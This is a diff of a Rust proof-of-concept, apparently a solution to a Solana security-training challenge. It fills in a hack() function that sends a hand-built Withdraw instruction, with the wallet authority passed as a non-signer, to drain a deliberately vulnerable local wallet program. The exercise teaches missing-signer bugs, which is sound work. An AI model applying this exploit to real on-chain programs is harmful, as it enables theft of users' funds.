@@ -1,4 +1,5 @@
 use std::{env, str::FromStr};
+use level1::WalletInstruction;
 
 use owo_colors::OwoColorize;
 use poc_framework::solana_sdk::signature::Keypair;
@@ -6,9 +7,12 @@ use poc_framework::{
     keypair, solana_sdk::signer::Signer, Environment, LocalEnvironment, PrintableTransaction,
 };
 use solana_program::native_token::lamports_to_sol;
+use solana_program::instruction::{Instruction, AccountMeta};
 
 use pocs::assert_tx_success;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
+
+use poc_framework::borsh::BorshSerialize;
 
 struct Challenge {
     hacker: Keypair,
@@ -18,7 +22,33 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
+
+    // We can steal from the wallet because the withdraw function
+    // does not verify that the signer of the transaction is the
+    // owner of the wallet.
+
+    let amount = sol_to_lamports(1_000_000.0);
+
+    // Execute our own raw instruction instead of using withdraw
+    // function in lib.
+    // Why? in `instruction.rs` line 99 requires that authority_address
+    // is a signer (this is what the `true` argument is doing).
+    // By calling the function like this, we bypass that requirement.
+    _env.execute_as_transaction(
+        &[Instruction {
+            program_id: _challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(_challenge.wallet_address, false),
+                AccountMeta::new(_challenge.wallet_authority, false),
+                AccountMeta::new(_challenge.hacker.pubkey(), true),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
+        }],
+        &[&_challenge.hacker],
+    );
+}
 
 /*
 SETUP CODE BELOW
